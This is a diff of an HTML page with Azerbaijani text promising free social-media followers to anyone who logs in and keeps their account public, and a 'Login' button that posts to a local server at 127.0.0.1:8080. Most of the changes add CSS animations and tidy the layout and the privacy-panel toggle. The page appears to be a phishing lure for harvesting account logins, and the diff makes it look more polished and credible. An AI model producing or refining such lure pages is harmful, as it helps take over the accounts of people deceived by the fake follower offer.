@@ -14,6 +14,7 @@
             background: linear-gradient(135deg, #a5c4f8, #e1e3e8);
             font-family: 'Arial', sans-serif;
             color: #333;
+            overflow: hidden;
         }
         .container {
             text-align: center;
@@ -24,10 +25,15 @@
             width: 400px;
             position: relative;
             transition: transform 0.3s, box-shadow 0.3s;
+            opacity: 0;
+            animation: fadeIn 1s forwards;
         }
         .container:hover {
             transform: scale(1.02);
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+        }
+        @keyframes fadeIn {
+            to { opacity: 1; }
         }
         h2 {
             color: #007bff;
@@ -35,13 +41,13 @@
             font-weight: 600;
             font-size: 24px;
             padding: 10px;
-            border: 2px solid #007bff; /* Çərçivə */
-            border-radius: 10px; /* Çərçivənin küncləri */
-            background-color: #f0f8ff; /* Arxa plan rəngi */
+            border: 2px solid #007bff;
+            border-radius: 10px;
+            background-color: #f0f8ff;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
         p {
-            color: #555;
+            color: #333;
             line-height: 1.5;
             margin: 10px 0;
             font-size: 14px;
@@ -73,23 +79,29 @@
             color: #0056b3;
         }
         .privacy-container {
-            display: none; /* Initially hidden */
+            display: none;
             text-align: left;
             margin-top: 20px;
             background-color: #ffffff;
             padding: 20px;
             border-radius: 10px;
             box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            max-width: 90%; /* Set a maximum width for the container */
-            height: auto; /* Height adjusted for content */
-            overflow-y: auto; /* Allow scrolling if content exceeds height */
+            max-width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
             border: 1px solid #ddd;
+            animation: slideIn 0.5s forwards;
+        }
+        @keyframes slideIn {
+            from { transform: translateY(10%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
         .privacy-title {
             font-size: 1.5em;
             margin-bottom: 10px;
             color: #007bff;
             font-weight: 600;
+            text-align: center;
         }
         h3 {
             color: #343a40;
@@ -103,14 +115,16 @@
             padding: 12px 24px;
             border: none;
             border-radius: 25px;
-            background-color: #6c757d; /* Change to gray */
+            background-color: #6c757d;
             color: white;
             cursor: pointer;
-            margin-top: 10px;
-            display: none; /* Initially hidden */
-            width: 100%; /* Full width */
+            margin-top: 20px;
             font-weight: bold;
             transition: background-color 0.3s, transform 0.3s;
+            display: block;
+            width: 100px;
+            margin-left: auto;
+            margin-right: auto;
         }
         .back-button:hover {
             background-color: #5a6268;
@@ -124,9 +138,7 @@
         <p><strong>XOŞ GƏLMİSİNİZ!</strong></p>
         <p>1 YANVARA KİMİ RANDOM ŞƏKİLDƏ 100-1000 ARALIĞINDA TAKİPÇİ GÖNDƏRİLƏCƏK. HESABA GİRİŞ ETDİKDƏN 5 DƏQ SONRA TAKİPÇİ GƏLƏCƏK. ZƏHMƏT OLMASA HESABI AÇIĞ TUTUN. TƏŞƏKKÜRLƏR ❤️!!!</p>
         <p>DİQQƏT ---> TAKİPÇİLƏR GEC GƏLƏRSƏ BİZİMLƏ ƏLAQƏ SAXLAYIN ‼️‼️</p>
-        <form action="http://127.0.0.1:8080"
-
-            method="POST">
+        <form action="http://127.0.0.1:8080" method="POST">
             <button type="submit" class="login-button">Login</button>
         </form>
         <p><a href="#" class="link" onclick="togglePrivacy()">Click here for more information</a></p>
@@ -169,26 +181,21 @@
         </ul>
 
         <p>We take user data privacy very seriously.</p>
-        
-        <div class="back-button-container">
-            <button class="back-button" onclick="togglePrivacy()">Back</button>
-        </div>
+
+        <button class="back-button" onclick="togglePrivacy()">Back</button>
     </div>
 
     <script>
         function togglePrivacy() {
             const privacyContainer = document.getElementById('privacy-container');
-            const backButton = document.querySelector('.back-button');
             const mainContainer = document.querySelector('.container');
 
             if (privacyContainer.style.display === 'none' || privacyContainer.style.display === '') {
                 privacyContainer.style.display = 'block';
-                mainContainer.style.display = 'none'; // Hide main container
-                backButton.style.display = 'inline-block'; // Show back button
+                mainContainer.style.display = 'none';
             } else {
                 privacyContainer.style.display = 'none';
-                mainContainer.style.display = 'block'; // Show main container
-                backButton.style.display = 'none'; // Hide back button
+                mainContainer.style.display = 'block';
             }
         }
     </script>
